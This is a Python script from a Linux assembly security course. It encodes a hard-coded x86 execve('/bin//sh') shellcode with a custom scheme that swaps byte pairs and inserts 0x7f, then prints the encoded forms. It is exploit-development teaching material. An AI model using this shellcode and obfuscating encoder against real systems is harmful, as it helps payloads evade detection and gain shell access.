# Encodes bytes using custom "swapsert" encoder.  Swaps bytes in pairs and inserts 0x7f between them.
# This was created as part of the SecurityTube Linux Assembly Expert
# course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
#
# Travis Mathison
#
# The MIT License (MIT)
#
# Copyright (c) 2018 Travis Mathison
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

#!/usr/bin/python

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
encoded = ""
encoded2 = ""

print('Encoded shellcode ...')

pos = 0
insert_byte = b"\x7f"
while (pos+1) < len(shellcode):
    encoded += "\\x%02x\\x%02x\\x%02x" % (shellcode[pos+1], shellcode[pos], insert_byte[0])
    encoded2 += "0x%02x,0x%02x,0x%02x," % (shellcode[pos+1], shellcode[pos], insert_byte[0])
    pos += 2

if not pos == len(shellcode):
    encoded += "\\x%02x\\x%02x\\x%02x" % (insert_byte[0], shellcode[pos], insert_byte[0])
    encoded2 += "0x%02x,0x%02x,0x%02x" % (insert_byte[0], shellcode[pos], insert_byte[0])

print("Original: \"" + "".join(map(lambda x: '\\x%02x' % x, shellcode)) + "\"")
print("")
print("Format1: \"" + encoded + "\"")
print("Format2: " + encoded2)

